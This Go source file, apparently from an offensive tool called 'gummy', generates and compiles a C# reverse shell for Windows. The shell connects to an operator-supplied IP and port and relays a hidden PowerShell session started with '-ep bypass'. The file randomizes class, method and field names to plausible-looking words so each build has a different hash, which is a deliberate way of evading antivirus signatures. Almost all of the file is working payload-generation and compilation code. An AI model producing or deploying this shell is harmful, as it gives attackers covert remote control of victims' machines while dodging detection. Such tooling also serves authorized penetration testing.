package internal

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/chsoares/gummy/internal/ui"
)

// CSharpShellGenerator generates custom C# reverse shell source code and compiles it.
// The generated shell uses TcpClient + Process (STDIN/STDOUT/STDERR redirect) —
// no shellcode, no PInvoke, no known-malicious components. Each build produces
// unique identifiers so file hashes differ between generations.
type CSharpShellGenerator struct {
	IP   string
	Port int
}

// NewCSharpShellGenerator creates a new generator with target IP and port.
func NewCSharpShellGenerator(ip string, port int) *CSharpShellGenerator {
	return &CSharpShellGenerator{IP: ip, Port: port}
}

// randID generates a short random identifier for C# symbol names.
func randID(n int) string {
	b := make([]byte, n)
	rand.Read(b)
	return hex.EncodeToString(b)
}

// plausibleName picks a plausible-looking C# name from word lists.
func plausibleName(prefixes, suffixes []string) string {
	prefixIdx := make([]byte, 1)
	suffixIdx := make([]byte, 1)
	rand.Read(prefixIdx)
	rand.Read(suffixIdx)
	return prefixes[int(prefixIdx[0])%len(prefixes)] + suffixes[int(suffixIdx[0])%len(suffixes)]
}

var (
	csNamePrefixes = []string{
		"Service", "Config", "Data", "Context", "Runtime",
		"Process", "System", "Channel", "Pipeline", "Session",
		"Network", "Client", "Handler", "Provider", "Cache",
	}
	csNameSuffixes = []string{
		"Manager", "Factory", "Controller", "Adapter", "Resolver",
		"Dispatcher", "Builder", "Processor", "Worker", "Agent",
		"Helper", "Proxy", "Monitor", "Registry", "Validator",
	}
	csVerbPrefixes = []string{
		"Get", "Set", "Init", "Process", "Handle",
		"Parse", "Load", "Build", "Create", "Open",
	}
	csFieldPrefixes = []string{
		"current", "active", "default", "internal", "cached",
		"pending", "primary", "last", "next", "base",
	}
)

func csClassName() string  { return plausibleName(csNamePrefixes, csNameSuffixes) }
func csMethodName() string { return plausibleName(csVerbPrefixes, csNameSuffixes) }
func csFieldName() string  { return plausibleName(csFieldPrefixes, csNameSuffixes) }

// GenerateSource returns the C# source code for a TCP reverse shell.
// All identifiers are randomized so each generation has a unique hash.
// Uses raw stream reading (not OutputDataReceived) so that partial lines
// like the PS prompt are sent immediately without waiting for a newline.
func (g *CSharpShellGenerator) GenerateSource() string {
	ns := csClassName()
	cls := csClassName()
	relayMethod := csMethodName()
	netStream := csFieldName()

	return fmt.Sprintf(`using System;
using System.IO;
using System.Net.Sockets;
using System.Diagnostics;
using System.Threading;

namespace %s
{
    internal class %s
    {
        private static Stream %s;

        static void Main(string[] args)
        {
            try
            {
                TcpClient client = new TcpClient();
                client.Connect("%s", %d);

                %s = client.GetStream();
                StreamReader streamReader = new StreamReader(%s);

                Process p = new Process();
                p.StartInfo.FileName = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
                p.StartInfo.Arguments = "-ep bypass -nologo";
                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.RedirectStandardError = true;
                p.StartInfo.RedirectStandardInput = true;

                p.Start();

                // Raw stream relay threads — forward bytes immediately,
                // including partial lines (like the PS prompt).
                new Thread(() => %s(p.StandardOutput.BaseStream)) { IsBackground = true }.Start();
                new Thread(() => %s(p.StandardError.BaseStream)) { IsBackground = true }.Start();

                string userInput = "";
                while (!userInput.Equals("exit"))
                {
                    userInput = streamReader.ReadLine();
                    p.StandardInput.WriteLine(userInput);
                }

                p.WaitForExit();
                client.Close();
            }
            catch (Exception) { }
        }

        private static void %s(Stream src)
        {
            try
            {
                byte[] buf = new byte[4096];
                int n;
                while ((n = src.Read(buf, 0, buf.Length)) > 0)
                {
                    %s.Write(buf, 0, n);
                    %s.Flush();
                }
            }
            catch { }
        }
    }
}
`, ns, cls, netStream,
		g.IP, g.Port,
		netStream, netStream,
		relayMethod, relayMethod,
		relayMethod,
		netStream, netStream,
	)
}

// GenerateAndCompile writes a C# project to a temp directory, compiles it,
// and copies the resulting exe to outputPath. Returns the output path or error.
func (g *CSharpShellGenerator) GenerateAndCompile(outputPath string) error {
	// Check for dotnet SDK
	if _, err := exec.LookPath("dotnet"); err != nil {
		return fmt.Errorf("dotnet SDK not found — install .NET 8+ SDK")
	}

	// Create temp project directory
	tmpDir, err := os.MkdirTemp("", "gummy_csharp_")
	if err != nil {
		return fmt.Errorf("failed to create temp dir: %w", err)
	}
	defer os.RemoveAll(tmpDir)

	projName := csClassName()

	// Write .csproj — net472 so it runs on any Windows without runtime install
	csproj := fmt.Sprintf(`<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net472</TargetFramework>
    <LangVersion>10</LangVersion>
    <AssemblyName>%s</AssemblyName>
  </PropertyGroup>
</Project>
`, projName)

	if err := os.WriteFile(filepath.Join(tmpDir, "Shell.csproj"), []byte(csproj), 0644); err != nil {
		return fmt.Errorf("failed to write .csproj: %w", err)
	}

	// Write Program.cs
	source := g.GenerateSource()
	if err := os.WriteFile(filepath.Join(tmpDir, "Program.cs"), []byte(source), 0644); err != nil {
		return fmt.Errorf("failed to write Program.cs: %w", err)
	}

	// Compile
	outDir := filepath.Join(tmpDir, "out")
	cmd := exec.Command("dotnet", "publish", tmpDir,
		"-c", "Release", "-o", outDir, "--nologo", "-v", "quiet")
	cmd.Stderr = nil
	cmd.Stdout = nil

	if err := cmd.Run(); err != nil {
		// Retry with output to get error details
		cmd2 := exec.Command("dotnet", "publish", tmpDir,
			"-c", "Release", "-o", outDir, "--nologo")
		out, _ := cmd2.CombinedOutput()
		return fmt.Errorf("compilation failed:\n%s", string(out))
	}

	// Find the output exe
	exePath := filepath.Join(outDir, projName+".exe")
	if _, err := os.Stat(exePath); os.IsNotExist(err) {
		// List what was produced
		entries, _ := os.ReadDir(outDir)
		var names []string
		for _, e := range entries {
			names = append(names, e.Name())
		}
		return fmt.Errorf("compiled exe not found at %s — files: %s", exePath, strings.Join(names, ", "))
	}

	// Copy to output path
	data, err := os.ReadFile(exePath)
	if err != nil {
		return fmt.Errorf("failed to read compiled exe: %w", err)
	}

	// Ensure output directory exists
	if dir := filepath.Dir(outputPath); dir != "." {
		os.MkdirAll(dir, 0755)
	}

	if err := os.WriteFile(outputPath, data, 0755); err != nil {
		return fmt.Errorf("failed to write output: %w", err)
	}

	return nil
}

// handleRevCSharp generates and optionally compiles a C# reverse shell.
// Called from the session manager when the user types "rev csharp [output]".
func handleRevCSharp(ip string, port int, args []string) {
	gen := NewCSharpShellGenerator(ip, port)

	// Determine output path
	outputPath := ""
	if len(args) > 0 {
		outputPath = args[0]
	}

	if outputPath == "" {
		// No output path — just show the source code
		fmt.Println(ui.CommandHelp("C# Reverse Shell (source)"))
		fmt.Println(gen.GenerateSource())
		fmt.Println(ui.HelpInfo("To compile: rev csharp <output.exe>"))
		return
	}

	// Compile mode
	fmt.Println(ui.Info(fmt.Sprintf("Generating C# reverse shell → %s:%d", ip, port)))

	if err := gen.GenerateAndCompile(outputPath); err != nil {
		fmt.Println(ui.Error(fmt.Sprintf("Build failed: %v", err)))
		return
	}

	// Get file size
	info, _ := os.Stat(outputPath)
	size := "?"
	if info != nil {
		size = fmt.Sprintf("%.1f KB", float64(info.Size())/1024)
	}

	fmt.Println(ui.Success(fmt.Sprintf("Compiled → %s (%s)", outputPath, size)))
}
